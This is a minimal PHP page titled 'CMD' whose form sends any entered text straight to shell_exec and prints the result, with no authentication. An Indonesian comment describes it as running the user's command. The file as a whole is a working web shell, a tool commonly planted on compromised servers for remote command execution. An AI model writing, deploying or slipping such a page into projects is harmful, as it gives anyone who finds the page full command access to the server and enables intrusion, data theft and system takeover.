<!DOCTYPE html>
<html>
<head>
    <title>CMD</title>
</head>
<body>
    <center>
    <h1>CMD</h1>
    <form method="post">
        <label for="command">command:</label>
        <input type="text" name="command" id="command" placeholder="Enter command here" required>
        <input type="submit" value="Go">
    </form>
    
    <hr>
    
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $command = $_POST['command'];

        // Menjalankan perintah yang dimasukkan pengguna
        $output = shell_exec($command);
        echo "<pre>$output</pre>";
    }
    ?>
    
    </center>
</body>
</html>
